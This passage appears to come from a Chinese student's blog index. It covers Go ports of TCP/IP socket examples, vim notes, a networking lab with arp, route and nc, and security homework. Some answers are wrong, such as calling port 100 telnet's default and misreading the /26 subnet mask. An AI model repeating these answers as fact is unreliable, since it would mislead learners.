net.Dial(\u0026#34;tcp\u0026#34;, address) if err != nil { log.Fatalf(\u0026#34;Failed to connect to server: %v\u0026#34;, err) } defer conn.Close() //net.Conn 对象来读取服务器发送的消息 message, err := io.ReadAll(conn) if err != nil { log.Fatalf(\u0026#34;Failed to read from server: %v\u0026#34;, err) } fmt.Printf(\u0026#34;Message from server: %s\\n\u0026#34;, message) } 运行 编译运行服务器 1 2 go build -o ch1/hello_server ch1/hello_server.go ./ch1/hello_server 8080 编译运行客户端 1 2 3 4 5 go build -o ch1/hello_client ch1/hello_client/hello_client.go ./ch1/hello_client 127.0.0.1 8080 Message from server: Hello world! 1.2 文件操作 打开文件 首先介绍打开文件以读写数据的函数。 调用此函数时需传递两个参数:第一个参数是打开的目标文件名及路径信息,第二个参数是文件打开模式(文件特性信息)。\n1 2 3 4 5 6 7 #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; int open(const char * path ，int flag) //成功时返回文件描述符事失败时返回1 //path 文件名字符串地址 //flag 文件打开模式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func Open(name string) (*File, error) { return OpenFile(name, O_RDONLY, 0) } // OpenFile 是一个通用的文件打开函数，它接受三个参数：文件名、打开文件的标志和文件权限。 // 它返回一个 *os.File 对象和一个 error 对象。如果打开文件失败，它会返回一个非 nil 的 error 对象。 func OpenFile(name string, flag int, perm FileMode) (*File, error) { // 记录打开文件的操作 testlog.Open(name) // 使用 openFileNolog 函数打开文件，这个函数不记录日志 f, err := openFileNolog(name, flag, perm) // 如果打开文件失败，返回错误 if err != nil { return nil, err } // 检查打开文件的标志是否包含 O_APPEND，如果包含，设置 f.appendMode 为 true f.appendMode = flag\u0026amp;O_APPEND != 0 // 返回打开的文件 return f, nil } 关闭文件 1 2 3 4 #include \u0026lt;unistd.h\u0026gt; int close(int fd); //成功时返回Q,失败时返回-1。 //fd:需要关闭的文件或套接字的文件描述符 1 2 3 4 5 6 7 8 9 10 // Close closes the File, rendering it unusable for I/O. // On files that support SetDeadline, any pending I/O operations will // be canceled and return immediately with an ErrClosed error. // Close will return an error if it has already been called. func (f *File) Close() error { if f == nil { return ErrInvalid } return f.file.close() } 将数据写入文件 1 2 3 4 5 6 #include \u0026lt;unistd.h\u0026gt; ssize_t write(int fd, const void * buf, size_t nbytes); //成功时返回写入的字节数,失败时返回-1。 //fd:数据传输对象的文件描述符 //buf 保存数据的缓冲地址 //nbytes：要传输的字节数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // write writes len(b) bytes to the File. // It returns the number of bytes written and an error, if any. // write 是 File 结构体的一个方法，它接受一个字节切片 b 作为参数， // 尝试将这个字节切片写入到文件中。 func (f *File) write(b []byte) (n int, err error) { // f.pfd.Write(b) 调用 pfd（代表平台依赖的文件描述符）的 Write 方法， // 尝试将 b 写入到文件。这个方法返回写入的字节数和一个错误（如果有的话）。 n, err = f.pfd.Write(b) // runtime.KeepAlive(f) 是一个用于防止 f 被垃圾回收的调用。 // 在某些情况下，如果 f 在 f.pfd.Write(b) 调用之后没有被再次使用， // Go 的垃圾回收器可能会在 Write 调用还在进行时就回收 f。 // runtime.KeepAlive(f) 确保 f 在 Write 调用完成之前不会被垃圾回收。 runtime.KeepAlive(f) // 返回写入的字节数和错误（如果有的话） return n, err } 代码示例改写 low_open.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package main import ( \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; ) func main() { buf := []byte(\u0026#34;Let\u0026#39;s go!\\n\u0026#34;) //打开文件，如果不存在则创建，如果存在则清空，权限为 0644 f, err := os.OpenFile(\u0026#34;data.txt\u0026#34;, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644) if err != nil { log.Fatalf(\u0026#34;open() error: %v\u0026#34;, err) } defer f.Close() //输出文件描述符 log.Printf(\u0026#34;file descriptor: %d \\n\u0026#34;, f.Fd()) //写入文件 _, err = f.Write(buf) if err != nil { log.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) } } 运行代码\n1 2 3 go build -o ch1/low_open ch1/lowOpen/low_open.go ./ch1/low_open file descriptor: 3 读取数据 1 2 3 4 5 6 #include \u0026lt;unistd.h\u0026gt; ssize_t read(int fdJ void * buf, size_t nbytes); //\u0026#39;成功时返回接收的字节数(但遇到文件结尾则返回θ),失败时返回10 //fd 显示数据接收对象的文件描述符。 //buf 要保存接收数据的缓冲地址值。 //nbytes 要接收数据的最大字节数。 示例代码改写 low_read.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package main import ( \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; ) func main() { //只读打开文件 f, err := os.Open(\u0026#34;data.txt\u0026#34;) if err != nil { log.Fatalf(\u0026#34;open() error: %v\u0026#34;, err) } defer f.Close() //输出文件描述符 log.Printf(\u0026#34;file descriptor: %d \\n\u0026#34;, f.Fd()) //读取文件 buf := make([]byte, 1024) n, err := f.Read(buf) if err != nil { log.Fatalf(\u0026#34;read() error: %v\u0026#34;, err) } log.Printf(\u0026#34;file data: %s\u0026#34;, buf[:n]) } 运行代码\n1 2 3 4 5 go build -o ch1/low_read ch1/lowRead/low_read.go ./ch1/low_read 2023/11/10 16:45:54 file descriptor: 3 2023/11/10 16:45:54 file data: Let\u0026#39;s go! 文件描述符与套接字 原文c代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; int main() { int fd1, fd2, fd3; //创建一个文件和两个套接字 fd1 = socket(PF_INET, SOCK_STREAM, 0); fd2 = open(\u0026#34;test.dat\u0026#34;, O_CREAT | O_WRONLY | O_TRUNC); fd3 = socket(PF_INET, SOCK_DGRAM, 0); //输出之前创建的文件描述符的整数值 printf(\u0026#34;file descriptor 1: %d\\n\u0026#34;, fd1); printf(\u0026#34;file descriptor 2: %d\\n\u0026#34;, fd2); printf(\u0026#34;file descriptor 3: %d\\n\u0026#34;, fd3); close(fd1); close(fd2); close(fd3); return 0; } 改写后 fd_seri.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;syscall\u0026#34; ) func main() { // 使用 syscall.Socket 函数创建一个 TCP 套接字，返回的是文件描述符 fd1 fd1, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) // 使用 os.OpenFile 函数创建一个文件 \u0026#34;test.dat\u0026#34;，返回的是 *os.File 类型的 fd2 fd2, _ := os.OpenFile(\u0026#34;test.dat\u0026#34;, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644) // 使用 syscall.Socket 函数创建一个 UDP 套接字，返回的是文件描述符 fd3 fd3, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0) // 使用 fmt.Printf 函数打印出三个文件描述符的值 // 注意，对于 *os.File 类型的 fd2，我们使用了 Fd 方法来获取其底层的文件描述符 fmt.Printf(\u0026#34;file descriptor 1: %d\\n\u0026#34;, fd1) fmt.Printf(\u0026#34;file descriptor 2: %d\\n\u0026#34;, fd2.Fd()) fmt.Printf(\u0026#34;file descriptor 3: %d\\n\u0026#34;, fd3) // 使用 Close 方法和 syscall.Close 函数关闭了这三个文件描述符，以释放系统资源 fd2.Close() syscall.Close(fd1) syscall.Close(fd3) } 运行\n1 2 3 4 5 go build -o ch1/fd_seri ch1/fdSeri/fd_seri.go ./ch1/fd_seri file descriptor 1: 3 file descriptor 2: 4 file descriptor 3: 5 1.3 基于Windows平台的实现 略\n1.4 基于Windows的套接字相关函数及示例 1.5 习题 套接字在网络编程中的作用是什么?为何称它为套接字? 套接字（socket）是网络编程中的抽象概念，它提供了一种机制，使得不同计算机之间可以进行通信和数据交换。套接字可以看作是网络通信的端点，它包含了通信所需的各种信息，如IP地址、端口号、协议等。套接字的名称来源于插座（socket），类比插座连接电器，套接字连接网络。通过套接字，计算机可以在网络上进行数据的发送和接收，实现网络通信的功能。\n在服务器端创建套接字后,会依次调用listen函数和accept 函数。请比较并说明二者作用。 listen函数用于将套接字标记为被动套接字，即用于接受客户端的连接请求。它告诉操作系统该套接字将用于接受传入的连接，而不是发起连接。在调用listen函数后，套接字将进入监听状态，等待客户端的连接请求。 accept函数用于从处于监听状态的套接字中接受一个连接。当客户端尝试连接到服务器时，服务器调用accept函数来接受这个连接，并创建一个新的套接字来与客户端进行通信。这个新的套接字可以用于与该客户端进行数据交换，而原始的监听套接字则继续等待其他客户端的连接请求。accept函数的返回值是一个新的套接字，通过它可以进行与客户端的通信。\nLinux中,对套接字数据进行I/O时可以直接使用文件I/O 相关函数;而在Windows中则不可以。原因为何? 这是因为在Linux中，套接字被视为一种文件描述符，因此可以使用文件I/O相关函数（如read和write）来进行I/O操作。而在Windows中，套接字和文件描述符是不同的概念，Windows采用了不同的I/O模型，因此不能直接使用文件I/O相关函数来对套接字数据进行I/O操作。在Windows中，需要使用特定的套接字I/O函数（如recv和send）来进行套接字数据的读写操作。\n创建套接字后一般会给它分配地址,为什么?为了完成地址分配需要调用哪个函数 创建套接字后需要给它分配地址，这是为了让其他主机能够找到并与该套接字进行通信。在网络编程中，这个地址通常是IP地址和端口号的组合。 为了完成地址分配，需要调用bind函数。bind函数将一个本地地址（IP地址和端口号）分配给套接字，使得其他主机可以通过这个地址与该套接字进行通信。\nLinux中的文件描述符与Windows的句柄实际上非常类似。请以套接字为对象说明它们的含义。 文件描述符和Windows的句柄在套接字的上下文中具有类似的含义。它们都是用来标识和引用套接字的抽象概念。 在Linux中，套接字也被视为一种文件描述符，因此可以使用类似于文件I/O的操作来进行套接字的读写等操作。 在Windows中，套接字使用句柄来进行引用和操作，句柄是一种抽象的引用类型，可以用来标识和操作套接字。 因此，无论是文件描述符还是句柄，它们都是用来引用和操作套接字这种抽象对象的标识符。\n底层文件I/O函数与ANSI 标准定义的文件I/O函数之间有何区别? 底层文件I/O函数是直接调用操作系统提供的文件操作接口，如open、read、write等，它们提供了对文件的低级别访问，可以更加灵活地控制文件的读写操作。 而ANSI标准定义的文件I/O函数则是标准C库中提供的一组文件操作函数，如fopen、fread、fwrite等，它们提供了更加抽象和便捷的文件操作接口，使得跨平台开发更加方便，并且提供了一些缓冲和错误处理的功能。 因此，底层文件I/O函数更加接近操作系统提供的文件操作接口，而ANSI标准定义的文件I/O函数则提供了更加便捷和跨平台的文件操作接口。\n参考本书给出的示例low_open.c 和low_read.c ,分别利用底层文件I/O 和ANSI标准I/O 编写文件复制程序。可任意指定复制程序的使用方法。\n","date":"2023-11-11T12:47:47+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCP、IP网络编程第一章笔记"},{"content":"尝试学习一下vim\nvim模式切换 normal转insert i 光标前插入 I行首插入 o进入下一行输入 O上一行插入 a光标之后输入 A行末尾插入\ninsert 转normal esc/jj 变回普通模式\nnormal转visual v变成可视模式（无法编辑）\nvisual转nomal esc或者v变回普通模式\n普通模式转命令模式 ：转成命令模式\n命令模式转普通模式 esc\n光标移动 普通模式下光标移动 动作 motion 操作符 删除全部 die 复制全部 yie u 撤销\n大小写 常用 gd 查看函数定义 ^O返回 g数字 切换标签/ctrl+数字 command+0 到文件夹 o打开 回车修改名字\neasymotion 空格空格s + 要查询的字幕 空格空格+e 空格空格+w\nvim surround 光标转移到终端 leader + t\n切换tab gt或gT\n","date":"2023-11-10T12:43:42+08:00","permalink":"https://anonymity-0.github.io/posts/vim/","title":"Vim"},{"content":"实验内容 arp 在 HostA 和 HostB 中分别打开一个终端用于本实验。\n在 HostA 和 HostB 中分别执行命令ifconfig ens5，查看并记录它们各自的IPv4 地址。执行命令 ifconfig ens6 查看 IPv6 地址 (global 和 link 两种) 以及以太网接口的物理地址。 截图： 命令解释： ifconfig 是一个用于配置和显示网络接口信息的命令。ens5 和 ens6 是网络接口的名称，通常用于表示以太网接口。ifconfig ens5 命令用于显示名为 ens5 的网络接口的配置信息，包括 IP 地址、子网掩码、广播地址、MAC 地址等。\n在 HostA 中执行命令 arp -n 或ip neigh show 查看并记录本机 ARP 缓存表的内容。\n命令解释： arp -n 是一个用于查看本地ARP缓存表的命令。它会显示已解析的IP地址和对应的MAC地址。 ip neigh show 是一个用于查看本地邻居表的命令。它会显示已解析的IP地址和对应的MAC地址，类似于 arp -n 命令。 arp -n 和 ip neigh show 都是用于查看本地ARP缓存表或邻居表的命令，它们的功能相似但有一些区别。\n命令格式不同：arp -n 是在大多数操作系统中使用的命令，而 ip neigh show 是在基于 Linux 的操作系统中使用的命令。 输出格式不同：arp -n 输出的结果通常是以表格形式显示的，包括IP地址和对应的MAC地址。而 ip neigh show 输出的结果可能更详细，包括IP地址、MAC地址、接口、状态等信息。 支持的功能不同：ip neigh show 命令在功能上更加强大，可以显示更多关于邻居的信息，如状态、接口类型等。而 arp -n 命令通常只显示基本的IP地址和MAC地址信息。 截图： 在 HostA 中执行命令 ping -c 1 HostB 的 IPv4 地址向 HostB 发送 ICMP 请求报文。收到 ICMP 响应后再次执行命令 arp -n 或ip neigh show 查看 HostA的 ARP 缓存表的内容。\n命令解释 ping -c 1 HostB 是一个用于向 HostB 发送一个 ICMP 回显请求（ping）的命令。其中，-c 1 表示只发送一次请求。\n截图 在 HostA 的 ARP 缓存表里面可获得 HostB 的 MAC 地址，记录下来，检查与 HostB 上ifconfig ens5 命令的执行结果是否一致。 与 HostB 上ifconfig ens5 命令的执行结果一致\n在 HostA 中执行命令ping -c 1 202.38.64.246，收到 ICMP 响应后继续执行命令ip neigh show 查看 HostA 的 ARP 缓存表，记录结果。简要解释为何无法看到对应于地址 202.38.64.246 的 ARP 表项而只能得到网关的某网卡的MAC 地址。提示：思考网段(链路)、广播域的概念。\n截图： 解释： 这是因为，ARP 协议用于在同一网段内查找主机的 MAC 地址。当 HostA 发送 ICMP 请求到目标地址 202.38.64.246 时，目标地址不在 HostA 的网段内，因此 HostA 需要向网关发送广播 ARP 请求。网关收到广播 ARP 请求后，会将自己的 MAC 地址回复给 HostA。HostA 收到网关的回复后，将网关的 MAC 地址存储在 ARP 缓存表中。因此，HostA 无法看到对应于地址 202.38.64.246 的 ARP 表项。\nIP 分别用命令 route -n 和命令route \u0026ndash;inet6 查看本机的 IPv4 和 IPv6 路由配置，记录所在子网的子网掩码/前缀长度，并于前面 ifconfig 的结果作比较。\n命令解释 route -n 是一个用于显示 IPv4 路由表的命令。它会列出系统中当前配置的所有 IPv4 路由项，包括目的网络、网关、子网掩码、接口和路由标志等信息。该命令中的 -n 选项表示以数字形式显示 IP 地址和子网掩码，而不进行主机名和网络地址的解析。 route --inet6 是一个用于显示 IPv6 路由表的命令。它会列出系统中当前配置的所有 IPv6 路由项，包括目的网络、网关、前缀长度、接口和路由标志等信息。该命令中的 --inet6 选项表示只显示 IPv6 路由表的信息。 截图： ![[Pasted image 20231106202048.png]] 比较两者的结果，可以看到，IPv4 和 IPv6 路由表中的子网掩码/前缀长度均与ifconfig的结果一致。\n执行以下两个命令分别查看系统内核的 IPv4 和 IPv6 的 FORWARD 值，记录下来。简单解释这个值的含义以及为何这个值是这样设定的。提示：思考主机与路由器的区别。\n命令 1：cat /proc/sys/net/ipv4/ip_forward 命令 2：cat /proc/sys/net/ipv6/conf/all/forwarding\n命令解释： 命令1：cat /proc/sys/net/ipv4/ip_forward 用于查看 IPv4 转发功能的状态。在 Linux 系统中，如果该值为 1，则表示启用了 IPv4 转发功能，即允许将数据包从一个网络接口转发到另一个网络接口。 命令2：cat /proc/sys/net/ipv6/conf/all/forwarding 用于查看 IPv6 转发功能的状态。类似于 IPv4，如果该值为 1，则表示启用了 IPv6 转发功能，允许将数据包从一个 IPv6 网络接口转发到另一个 IPv6 网络接口。\n截图： 解释： 可以看到，系统内核的 IPv4 和 IPv6 的 FORWARD 值均为 0。FORWARD 值的含义是是否允许系统转发 IP 数据包。如果 FORWARD 值为 0，则系统不允许转发 IP 数据包。主机和路由器的区别在于，主机只能与同一子网内的主机通信，而路由器可以连接多个子网，并负责将数据包从一个子网转发到另一个子网。由于主机只能与同一子网内的主机通信，因此不需要转发 IP 数据包。因此，主机的 FORWARD 值通常为 0。\nTCP 在 S 的终端 1 中执行 nc -l 1958 侦听1958 端口。。 命令解释： 命令 nc -l 1958 将在 TCP 端口 1958 上监听传入连接\nnc：netcat 命令 -l：监听传入连接 1958：端口号 截图： 在HostA 的终端 1 执行nc S 的IPv4 地址 1958\n截图： 在HostA 终端 2 中执行命令netstat -aunt 来观察自己主机上的所有 TCP 与UDP 连接状况，将输出的信息记录下来。请在上述记录的结果中找到对应于上述连接的那条记录并解释这条记录的含义。\n命令解释： 执行 netstat -aunt 命令可以查看当前系统上所有的网络连接和监听端口，以及它们的状态、协议类型、本地地址和远程地址等信息 截图： 这条记录表示，HostA 主机的60260端口与 S 主机的 1958 端口建立了 TCP 连接。\n执行命令 nc S 的 IPv4 地址 100，记录命令执行结果。同样使用 netstat -aunt 来查看本机的连接状况，请判断这次 telnet 连接是否成功建立并简单说明原因。 原因是 100 端口是 telnet 服务器的默认端口，但 S 主机没有在 100 端口上监听 telnet 连接。因此，HostA 主机无法与 S 主机建立 telnet 连接。\n思考题 现在有一个网段的 IP 地址和子网掩码分别为202.38.75.0/255.255.255.192，请计算该网段中一共有多少个全局 IPv4 地址可供主机使用，或者说这个网络中有多少真正可分配的 IP 地址？\n子网掩码 255.255.255.192 的二进制表示为 11111111 11111111 11111111 11000000，其中前 24 位为 1，表示该网段的网络地址部分，后 8 位为 0，表示该网段的广播地址部分。因此，该网段中一共有 2^6 - 2 = 62 个全局 IPv4 地址可供主机使用。\n实验中执行 ifconfig ens3 查看接口的配置信息时可以观察到一个重要的参数MTU，请问这个值是多少？查询资料说明 MTU 参数的用途。\nMTU 是最大传输单元（Maximum Transmission Unit）的缩写，指的是网络层协议所能通过的最大数据包大小。MTU 的值通常与通信接口有关（网络接口卡、串口等）。 MTU 的值通常以字节为单位，常见的默认值是 1500 字节。这是因为以太网是最常见的网络类型，而以太网的标准帧大小为 1518 字节（包括帧头和帧尾），减去以太网帧头的 18 字节，剩下的 1500 字节就是可用于数据传输的最大数据量。 当数据包的大小超过 MTU 值时，网络层协议会将数据包分片，将数据包拆分成多个小数据包，然后分别传输。分片会增加网络层协议的复杂度，并降低网络效率。因此，在实际应用中，需要根据网络环境调整 MTU 参数的值，以保证数据包能够正常传输，并提高网络效率。\n9. IPv6 地址长度是 IPv4 地址长度的 4 倍，不过在今后的纯 IPv6 网络环境中路由器的 路由表的规模反而有望减小，请简单解释这是为什么？\n在纯 IPv6 网络环境中，路由器的路由表规模有望减小的原因： 1. IPv6 支持路由重叠，即多个路由器可以指向同一个目标地址。这意味着 IPv6 路由器可以共享路由信息，从而减少路由条目的数量。 2. IPv6 路由表结构更加简化。IPv6 路由表采用了扁平化的结构，每个路由表项只需要存储一个目标地址和下一跳地址即可。而 IPv4 路由表采用了分层的结构，每个路由表项还需要存储一个前缀长度和子网掩码。 3. IPv6没有私有地址和NAT技术,减少了路由表中的条目。 4. IPv6 支持动态路由，即路由器可以自动学习到目标地址的路由信息。这意味着 IPv6 路由器不需要手动配置路由条目，从而减少路由条目的数量。 一条 TCP 连接需要哪几个参数标识？\n一条 TCP 连接需要四个参数来标识，即：\n本地 IP 地址：表示连接的本地主机的 IP 地址。 本地端口号：表示连接的本地主机的端口号。 远程 IP 地址：表示连接的远程主机的 IP 地址。 远程端口号：表示连接的远程主机的端口号。 ","date":"2023-11-07T12:46:21+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C1/","title":"信网实验1"},{"content":"得分：10/10\n路由配置 配置路由器Router 安装远程访问“角色和功能” 设置IP地址和默认网关的IP地址。 启用“路由和远程访问服务” 关闭防火墙 ![[Pasted image 20231024224258.png|300]]\n配置VPN Server 路由远程访问服务器设置 ![[Pasted image 20231023164229.png|400]]\n新建用户 ![[Pasted image 20231024224417.png|400]]\nVPN server的ip地址配置 ![[Pasted image 20231024223002.png|400]]\n配置客户端 client B的ip地址 将ip地址设置为192.168.86.24 24为学号末2位 client A的ip地址 将ip地址设置为55.0.0.24 ![[Pasted image 20231024211518.png|400]]\nVPN连接 进行VPN连接 ![[Pasted image 20231024223124.png|400]]\n连接后的IP变化 clientA ![[Pasted image 20231024221917.png|400]]\nVPN Server ![[Pasted image 20231024223749.png|400]]\nwireshark抓包 ","date":"2023-10-26T15:51:26+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A2/","title":"网络安全作业2"},{"content":"得分：10/10\n简述防火墙的定义 防火墙是位于两个(或多个)网络之间执行访问控制的软件和硬件系统，它根据访问控制规则对进出网络的数据流进行过滤。\n防火墙对数据流的拒绝和丢弃有何区别?\n当数据流被拒绝时，防火墙要向发送者回复一条消息，用ICMP包告知数据源数据包被拒绝的原因，提示发送者该数据流已被拒绝。 当数据流被丢弃时，防火墙不会对这些数据包进行任何处理，也不会向发送者发送任何提示信息。丢弃数据包的做法加长了网络扫描所花费的时间，发送者只能等待回应直至通信超时。 简述数据包过滤器和状态防火墙。\n数据包过滤器通过数据包的头部信息来判断是接受还是拒绝数据包，它并不查看数据包载荷中的应用数据。这种防火墙检查流经它的每个数据包，根据数据包本身所带的信息决定它的去留，而不用参考其他数据包的内容。 状态防火墙会通过对流经的数据包的分析查找通信中的数据流，根据数据流的信息来帮助判断是否让数据包通行。数据流提供了数据包的上下文。状态防火墙有时还会检测一些常用协议的应用数据（虽然可以检测的数据量是有限的），通过这些数据来识别和跟踪相关的数据流。 与包过滤防火墙相比，应用代理防火墙有哪些特点？\n在已有的安全模型中安全性较高。 具有强大的认证功能。 具有超强的日志功能。 应用级网关防火墙的规则配置比较简单 在防火墙的典型部署中，堡垒主机是一个组织机构网络安全的中心主机，它应该具备哪些主要特征？\n堡垒主机硬件平台运行较为安全的操作系统，成为可信任的系统。 只有网络管理员认为必要的服务(代理和用户认证等)才会安装在堡垒主机上。 当允许一个用户访问代理服务时，堡垒主机可能会要求进行额外认证。另外，每一个代理服务都可能需要相应的鉴别机制(Authentication) 每一个代理都只能支持标准应用服务命令集中的一个子集。 每一个代理只允许访问指定主机的通信，支持对通信进行详细的审计。 每一个代理模块都是一个为网络安全设计的一个很小的软件包。 代理之间相互独立。 代理通常无需进行磁盘访问，不需要读取初始配置文件。这使得入侵者很难在主机上安装Trojan horse、sniffers或其他危险的文件。 堡垒主机是一个组织机构网络安全的中心主机。 ","date":"2023-10-26T10:17:18+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/","title":"网络安全作业3"},{"content":"得分：9/10\n第一章 1. 如果你的网络服务器被黑客远程控制，列举3个可能被破坏的安全属性， 并解释理由。 机密性： 理由：远程控制服务器后，黑客可以在未被授权的情况下获取个人信息、数据库记录等数据，导致数据泄露和隐私侵犯。 完整性： 理由：黑客远程服务器后，可以篡改服务器上的数据或者程序文件，修改网站内容、更改配置文件、插入恶意代码等。 可用性： 理由：黑客可能通过远程控制服务器发动拒绝服务攻击或直接禁用服务器上的关键服务和功能，导致服务器无法正常运行。 不可抵赖性： 理由：黑客可以使用服务器的访问权限执行恶意操作如数据篡改。如果服务器没有足够的安全措施来记录这些操作并确保其不可抵赖性，那么黑客可能会否认曾经执行过这些操作，导致难以追踪和证明责任。\n2. 简述RFC2828安全服务的定义，例举Windows10系统的3种安全服务。\nRFC2828定义了安全服务为一种由系统提供的对系统资源进行特殊保护的处理或通信服务，安全服务通过安全机制来实现安全策略。ITU-T（即X.800）定义了五种服务：身份认证、访问控制、数据保密、数据完整性、不可否认。 Windows 10操作系统中的三种安全服务：\n认证服务：认证服务用于验证用户的身份，确保只有经过授权的用户能够访问系统或资源。在Windows 10中，用户必须提供正确的用户名和密码才能登录到系统。 访问控制服务：访问控制服务用于确定哪些用户或实体具有权限访问特定资源或执行特定操作，并确保未经授权的访问被拒绝。在Windows 10中，访问控制服务管理文件和文件夹的权限，以及系统资源的访问权限。 加密服务：加密服务用于将敏感数据转化为不可读的格式，以确保即使数据被未经授权的访问者获取，也无法理解其内容。只有具有正确密钥的用户才能解密数据。BitLocker是一个Windows 10中的工具，它可以加密整个硬盘或者某些部分，以保护数据免受丢失或盗取的威胁。 3 . 简述网络安全防护主要目标的“五不”。 1. 不泄露（Non-Disclosure）：确保网络中的敏感信息和数据不会泄露给未经授权的用户或系统。 2. 不破坏（Non-Destruction）：防止网络系统和数据被破坏、损坏或篡改。 3. 不拒绝（Non-Repudiation）：确保在网络交互中的各种操作和交易都可以被证明，不容易被否认。 4. 不中断（Non-Interruption）：确保网络服务的持续可用性，防止由于攻击、故障或其他原因导致的网络服务中断。 5. 不迟滞（Non-Delay）：保障网络通信的实时性，防止因网络拥塞、延迟或其他问题导致通信延迟。\n第三章 1. 在腾讯会议系统中，对称密码技术和公钥密码技术适合应用在哪几个阶段?说明理由。\n会话加密阶段：对称密码技术非常适合在会话加密阶段使用。一旦参与会议的用户建立了安全连接，可以使用对称加密算法来加密和解密数据通信。这是因为对称密码技术具有较高的加密和解密速度，使其非常适合对大量的音视频数据进行快速的加密和解密操作。\n登录时身份验证和密钥交换阶段：公钥密码技术通常用于安全地进行身份验证和密钥交换。在腾讯会议系统中，当用户首次登录时，可以使用公钥密码技术来验证其身份，并协商用于对称加密的会话密钥。\n2. 简述散列函数MD5的碰撞问题。既然MD5存在碰撞问题，为何http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/ 仍然给出MD5值作为完整性验证的依据。 MD5的碰撞问题是指两个不同的输入数据在经过MD5算法处理后，得到了相同的散列值。这种情况被称为碰撞。 至于为什么仍然给出MD5值作为完整性验证的依据，可能是因为MD5是一个相对快速的散列函数，适用于快速验证大量文件的完整性。发行盘之后的系统安装和软件安装也有额外的安全验证程序。\n3. 简述用RSA公钥算法实现数字签名的过程。（这个问题回答的不好） 数字签名过程如下： 1. 发送者使用自己的私钥对消息进行加密，生成数字签名。 2. 发送者将消息和数字签名一起发送给接收者。 3. 接收者使用发送者的公钥对数字签名进行解密，得到消息的摘要。 4. 接收者使用相同的摘要算法对消息进行摘要处理，得到摘要。 5. 接收者比较两个摘要是否相同，如果相同，则说明消息没有被篡改过。\n4. 用PGP加密某个文件，如果接收该加密文件的用户为1个，加密文件的大小为24kB；如果接收该加密文件的用户 为10个，请问加密文件的大小是原来的10倍(240kB)吗？为什么？ 答：加密文件的大小不会是原来的10倍，由于对称密钥是相对较短的，每个接收者的非对称密钥通常很小。因此，无论接收者数量是1个还是10个，对称密钥密文的总大小都不会显著增加，而文件内容加密只需一次，因此文件大小仍然是原始文件大小（24kB）加上对称密钥密文的大小的总和，而不会变成原来的10倍。\n","date":"2023-10-26T10:17:13+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A1/","title":"网络安全作业1"},{"content":"网络安全实验配置 由于Mac的m系列芯片使用了arm架构与windows server镜像要求的x86架构不同，老师使用的virtual box和mac最常用的pd模拟器均只能进行同架构系统的模拟。于是乎我又查阅了资料，发现UTM可以在mac上进行不同架构的模拟（虽然很卡也很难用，终归是跑通了），以下是我的配置过程:\nUTM下载和安装 直接官网UTM | Virtual machines for Mac下载并安装就好。\nwindows server镜像下载 这时候又出岔子了，老师提供的windows 2003不知道是不是太老了，UTM模拟不了。只能想办法换更新的windows sever2012 下载镜像地址：HelloWindows.cn - 精校 完整 极致 Windows系统下载仓储站 注：需下载迅雷进行磁力链下载\nwireshark的安装 直接官网Wireshark · Go Deep下载安装就好\nUTM和本地文件的共享 待补充\n终于是能在mac上跑实验了，类目。\nUTM下复制的主机互ping问题 本来像按照老师所给的内容配置了七个host-only网络，网络是可以搭建起来的，但是server和client两个虚拟机之间无法互ping。 查阅了很多资料之后发现得设置成桥接模式，并把接口设置成en0即可。如图： ","date":"2023-10-26T10:15:50+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E9%85%8D%E7%BD%AE/","title":"网络安全实验配置"},{"content":"参考：快速入门 | Hugo 中文网\n环境准备 安装hugo brew install hugo\n问题1\n1 2 3 Cloning into \u0026#39;/Users/agq/Library/Caches/Homebrew/hugo--git\u0026#39;... fatal: unable to access \u0026#39;https://github.com/gohugoio/hugo.git/\u0026#39;: Recv failure: Operation timed out 解决方法：关闭代理\n问题2\n1 2 3 Cloning into \u0026#39;/Users/agq/Library/Caches/Homebrew/hugo--git\u0026#39;... fatal: unable to access \u0026#39;https://github.com/gohugoio/hugo.git/\u0026#39;: Failed to connect to github.com port 443 after 75008 ms: Couldn\u0026#39;t connect to server 配置代理\n1 2 3 4 5 git config --global http.proxy 127.0.0.1:7890 git config --global https.proxy 127.0.0.1:7890 git config --global http.proxy socks5 127.0.0.1:7890 git config --global https.proxy socks5 127.0.0.1:7890 问题3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Error: Your Command Line Tools (CLT) does not support macOS 14. It is either outdated or was modified. 